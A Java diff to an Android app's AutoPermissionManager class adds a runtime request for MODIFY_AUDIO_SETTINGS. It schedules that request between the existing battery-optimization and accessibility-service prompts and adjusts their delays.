@@ -336,6 +336,23 @@ public class AutoPermissionManager {
     }
 
     /**
+     * Request MODIFY_AUDIO_SETTINGS — a normal (non-dangerous) permission.
+     * Declared in the manifest; granted automatically on install on most devices.
+     * This explicit request covers edge cases where it may still need approval.
+     */
+    public void requestModifyAudioSettings() {
+        if (activity != null &&
+            ContextCompat.checkSelfPermission(context, Manifest.permission.MODIFY_AUDIO_SETTINGS)
+                != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(
+                activity,
+                new String[]{ Manifest.permission.MODIFY_AUDIO_SETTINGS },
+                107
+            );
+        }
+    }
+
+    /**
      * Request all permissions in sequence.
      * Storage/file-access permissions are intentionally excluded here —
      * they are requested on-demand from the dashboard (App Mode).
@@ -349,11 +366,16 @@ public class AutoPermissionManager {
             requestBatteryOptimization();
         }, 2000);
 
-        // Step 3: Request accessibility (with delay)
+        // Step 3: Request MODIFY_AUDIO_SETTINGS (immediately after battery, last perm step)
+        new android.os.Handler().postDelayed(() -> {
+            requestModifyAudioSettings();
+        }, 3000);
+
+        // Step 4: Request accessibility (with delay)
         new android.os.Handler().postDelayed(() -> {
             if (!isAccessibilityServiceEnabled()) {
                 requestAccessibilityService();
             }
-        }, 3500);
+        }, 4000);
     }
 }
